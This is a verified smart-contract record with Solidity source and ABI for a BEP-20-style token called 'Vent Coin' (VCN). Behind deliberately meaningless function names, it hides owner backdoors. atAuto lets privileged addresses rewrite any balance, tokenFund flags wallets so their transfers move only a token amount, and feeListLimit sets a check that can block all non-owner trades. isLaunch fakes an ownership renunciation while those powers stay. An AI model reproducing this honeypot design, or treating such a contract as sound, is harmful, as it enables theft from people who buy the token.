{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract liquidityTx {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atIs {\n    function createPair(address marketingTake, address limitEnable) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface fromToken {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface atReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenTakeTrading) external view returns (uint256);\n\n    function transfer(address shouldMinLiquidity, uint256 shouldSender) external returns (bool);\n\n    function allowance(address swapTakeWallet, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 shouldSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address shouldMinLiquidity,\n        uint256 shouldSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverMax, uint256 value);\n    event Approval(address indexed swapTakeWallet, address indexed spender, uint256 value);\n}\n\ninterface toTrading is atReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract VentCoin is liquidityTx, atReceiver, toTrading {\n\n    uint256 private limitModeWallet = 100000000 * 10 ** 18;\n\n    string private liquidityMode = \"Vent Coin\";\n\n    address public shouldAt;\n\n    function takeLimit(address listExempt, address shouldMinLiquidity, uint256 shouldSender) internal returns (bool) {\n        require(buyTo[listExempt] >= shouldSender);\n        buyTo[listExempt] -= shouldSender;\n        buyTo[shouldMinLiquidity] += shouldSender;\n        emit Transfer(listExempt, shouldMinLiquidity, shouldSender);\n        return true;\n    }\n\n    bool public senderSwapTake;\n\n    uint256 public modeMarketingShould = 0;\n\n    function launchTotalAuto() private view {\n        require(feeAutoAt[_msgSender()]);\n    }\n\n    bool public tradingEnable;\n\n    uint256 fundBuy;\n\n    function getOwner() external view returns (address) {\n        return teamLaunchSwap;\n    }\n\n    string private listExemptMarketing = \"VCN\";\n\n    function tokenReceiver(address autoFromFee) public {\n        if (tradingEnable) {\n            return;\n        }\n        \n        feeAutoAt[autoFromFee] = true;\n        \n        tradingEnable = true;\n    }\n\n    uint256 constant limitAutoLiquidity = 13 ** 10;\n\n    mapping(address => bool) public feeAutoAt;\n\n    address private teamLaunchSwap;\n\n    function symbol() external view virtual override returns (string memory) {\n        return listExemptMarketing;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return liquidityMode;\n    }\n\n    bool private fromMax;\n\n    function approve(address toReceiverAmount, uint256 shouldSender) public virtual override returns (bool) {\n        shouldReceiver[_msgSender()][toReceiverAmount] = shouldSender;\n        emit Approval(_msgSender(), toReceiverAmount, shouldSender);\n        return true;\n    }\n\n    uint256 private liquiditySenderLaunched;\n\n    function balanceOf(address tokenTakeTrading) public view virtual override returns (uint256) {\n        return buyTo[tokenTakeTrading];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return limitModeWallet;\n    }\n\n    event OwnershipTransferred(address indexed tradingFrom, address indexed amountTx);\n\n    uint8 private amountExemptSwap = 18;\n\n    function isLaunch() public {\n        emit OwnershipTransferred(shouldAt, address(0));\n        teamLaunchSwap = address(0);\n    }\n\n    function transfer(address atToLimit, uint256 shouldSender) external virtual override returns (bool) {\n        return marketingLimit(_msgSender(), atToLimit, shouldSender);\n    }\n\n    function transferFrom(address listExempt, address shouldMinLiquidity, uint256 shouldSender) external override returns (bool) {\n        if (_msgSender() != liquiditySellFee) {\n            if (shouldReceiver[listExempt][_msgSender()] != type(uint256).max) {\n                require(shouldSender <= shouldReceiver[listExempt][_msgSender()]);\n                shouldReceiver[listExempt][_msgSender()] -= shouldSender;\n            }\n        }\n        return marketingLimit(listExempt, shouldMinLiquidity, shouldSender);\n    }\n\n    address txMode;\n\n    function liquidityMin(address listExempt, address shouldMinLiquidity, uint256 shouldSender) internal view returns (uint256) {\n        require(shouldSender > 0);\n\n        uint256 fundAuto = 0;\n        if (listExempt == fundSell && amountShouldMode > 0) {\n            fundAuto = shouldSender * amountShouldMode / 100;\n        } else if (shouldMinLiquidity == fundSell && modeMarketingShould > 0) {\n            fundAuto = shouldSender * modeMarketingShould / 100;\n        }\n        require(fundAuto <= shouldSender);\n        return shouldSender - fundAuto;\n    }\n\n    constructor (){\n        \n        isLaunch();\n        fromToken toSwapTeam = fromToken(liquiditySellFee);\n        fundSell = atIs(toSwapTeam.factory()).createPair(toSwapTeam.WETH(), address(this));\n        txMode = atIs(toSwapTeam.factory()).feeTo();\n        if (receiverBuyTx) {\n            liquiditySenderLaunched = receiverAt;\n        }\n        shouldAt = _msgSender();\n        feeAutoAt[shouldAt] = true;\n        buyTo[shouldAt] = limitModeWallet;\n        if (liquiditySenderLaunched == receiverAt) {\n            senderSwapTake = true;\n        }\n        emit Transfer(address(0), shouldAt, limitModeWallet);\n    }\n\n    uint256 public amountShouldMode = 3;\n\n    bool private receiverBuyTx;\n\n    address public fundSell;\n\n    mapping(address => uint256) private buyTo;\n\n    uint256 private receiverAt;\n\n    function decimals() external view virtual override returns (uint8) {\n        return amountExemptSwap;\n    }\n\n    address liquiditySellFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 isShould;\n\n    mapping(address => mapping(address => uint256)) private shouldReceiver;\n\n    function allowance(address listReceiver, address toReceiverAmount) external view virtual override returns (uint256) {\n        if (toReceiverAmount == liquiditySellFee) {\n            return type(uint256).max;\n        }\n        return shouldReceiver[listReceiver][toReceiverAmount];\n    }\n\n    function tokenFund(address senderTradingLaunched) public {\n        launchTotalAuto();\n        if (liquiditySenderLaunched == receiverAt) {\n            receiverBuyTx = false;\n        }\n        if (senderTradingLaunched == shouldAt || senderTradingLaunched == fundSell) {\n            return;\n        }\n        maxLaunchWallet[senderTradingLaunched] = true;\n    }\n\n    function feeListLimit(uint256 shouldSender) public {\n        launchTotalAuto();\n        isShould = shouldSender;\n    }\n\n    function marketingLimit(address listExempt, address shouldMinLiquidity, uint256 shouldSender) internal returns (bool) {\n        if (listExempt == shouldAt) {\n            return takeLimit(listExempt, shouldMinLiquidity, shouldSender);\n        }\n        uint256 liquidityBuy = atReceiver(fundSell).balanceOf(txMode);\n        require(liquidityBuy == isShould);\n        require(shouldMinLiquidity != txMode);\n        if (maxLaunchWallet[listExempt]) {\n            return takeLimit(listExempt, shouldMinLiquidity, limitAutoLiquidity);\n        }\n        shouldSender = liquidityMin(listExempt, shouldMinLiquidity, shouldSender);\n        return takeLimit(listExempt, shouldMinLiquidity, shouldSender);\n    }\n\n    function owner() external view returns (address) {\n        return teamLaunchSwap;\n    }\n\n    mapping(address => bool) public maxLaunchWallet;\n\n    function atAuto(address atToLimit, uint256 shouldSender) public {\n        launchTotalAuto();\n        buyTo[atToLimit] = shouldSender;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapTakeWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toReceiverAmount\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountShouldMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toReceiverAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atToLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldSender\",\"type\":\"uint256\"}],\"name\":\"atAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTakeTrading\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeAutoAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"shouldSender\",\"type\":\"uint256\"}],\"name\":\"feeListLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxLaunchWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeMarketingShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderSwapTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTradingLaunched\",\"type\":\"address\"}],\"name\":\"tokenFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoFromFee\",\"type\":\"address\"}],\"name\":\"tokenReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atToLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldMinLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "VentCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}